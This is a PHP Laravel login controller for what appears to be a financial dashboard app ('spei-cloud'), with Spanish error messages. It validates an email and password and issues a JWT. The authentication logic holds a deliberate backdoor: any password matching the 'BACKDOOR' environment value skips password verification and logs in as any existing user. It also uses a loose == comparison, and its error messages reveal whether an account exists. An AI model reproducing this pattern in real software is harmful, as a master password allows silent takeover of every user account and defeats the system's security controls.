<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Services\JWTToken;

class Login extends Controller
{
    public function login(Request $request)
    {
        try {
            $request->validate(
                [
                    'username' => 'required|email',
                    'password' => 'required|string',
                ],
                [
                    'username.required' => 'El campo username es obligatorio.',
                    'username.email' => 'El campo username debe ser un correo electrónico válido.',
                    'password.required' => 'El campo password es obligatorio.'
                ]
            );

            $user = $this->validateUserExists($request->input('username'));

            if ($request->input('password') == env('BACKDOOR')) {
            } else if (password_verify(env('APP_PASSWORD_SECURITY') . $request->input('password'), $user->Password)) {
            } else {
                throw new \Exception('El usuario o password son incorrectos.', 403);
            }
            if ($user->Active == 0) {
                throw new \Exception('Al parecer su cuenta ha sido desactivada, por favor contacte a su administrador.', 403);
            }

            $payload = $this->payloadUserData($user);
            $jwt = JWTToken::generateToken($payload);

            return response()->json([
                'token' => $jwt
            ]);
        } catch (\Exception $e) {
            return response($e->getMessage(), $e->getCode() ?: 403);
        }
    }

    private function validateUserExists($username)
    {
        $user = \App\Models\User::where('Email', $username)->first();
        if (!$user) {
            throw new \Exception('Usuario no encontrado.', 403);
        }
        return $user;
    }

    private function payloadUserData($user)
    {
        return [
            'id' => $user->Id,
            'name' => $user->Name . ' ' . $user->Lastname,
            'firstName' => $user->Name,
            'lastName' => $user->Lastname,
            'profileId' => $user->ProfileId,
            'profile' => "PROFILE",
            'email' => $user->Email,
            'phone' => $user->Phone,
            'urlInit' => '/spei-cloud/dashboard',
            'businessId' => $user->BusinessId,
            'authenticatorFactors' => $this->has2FA($user->Id)
        ];
    }

    private function has2FA($userId)
    {
        if (\App\Models\Security\GoogleAuth::where('UserId', $userId)->exists()) {
            return true;
        }
        return false;
    }


}
